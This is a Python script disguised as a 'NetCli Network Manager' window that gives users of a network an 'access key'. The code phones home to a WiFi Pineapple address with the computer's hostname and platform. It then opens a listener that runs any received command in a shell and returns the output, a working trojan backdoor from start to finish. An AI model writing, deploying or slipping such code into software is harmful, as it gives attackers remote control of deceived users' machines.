import time
import socket,subprocess
from random import randint
import platform
import threading
import sys
from Tkinter import *

rhost = '172.16.42.1'
rport = 4443

def execShellCmd(sock, cmd):
	proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	stdout_value = proc.stdout.read() + proc.stderr.read()
	sock.sendall(stdout_value)

top = Tk()
top.title("NetCli Network Manager")
var = StringVar()
text = Label(top, textvariable=var, relief=RAISED)

# Create a listener for the new shell and a socket to connect back
# to the Pineapple to send information about the new listener.
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c_bk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect back to the Pineapple
# If the connection fails don't show the user the access key, instead present an error
# that informs them they must run the NetworkClient again.
try:
	c_bk.connect((rhost,rport))
except socket.error as sockerr:
	sys.exit()

# Pick a random port number on which to listen
bound = False
while bound == False:
	lport = randint(30000, 65534)
	try:
		listener.bind((socket.gethostbyname(socket.gethostname()), lport))
		bound = True
	except:
		bound = False
		continue

# Send the port number of the new listener back to the Pineapple along with other system information
sysinfo = ";".join([str(lport), socket.gethostname(), platform.platform()])
c_bk.send(sysinfo)

# Wait to receive the access key
accessKey = c_bk.recv(1024)

# Close the connection back to the Pineapple
c_bk.close()

var.set("\nPlease leave this window open at all times while you are connected to the network.\n\nHere is your access key: " + accessKey + ".\n\nDo not give out your access key as it is tied to your computer.\n\nHappy surfing!\n")
text.pack()

threads = []
def serverThread(listener):
	_threads = []
	connected = False
	listener.listen(5)
	while 1:
		if not connected:
			(client, address) = listener.accept()
			connected = True
		while 1:
			try:
				cmd = client.recv(4096)
				shellThread = threading.Thread(target=execShellCmd, args=(client,cmd))
				_threads.append(shellThread)
				shellThread.start()
				
				if not len(cmd):
					connected = False
					break
			except:
				connected = False
				break
	
	listener.close()

srvThread = threading.Thread(target=serverThread, args=(listener,))
threads.append(srvThread)
srvThread.start()

top.lift()
top.mainloop()
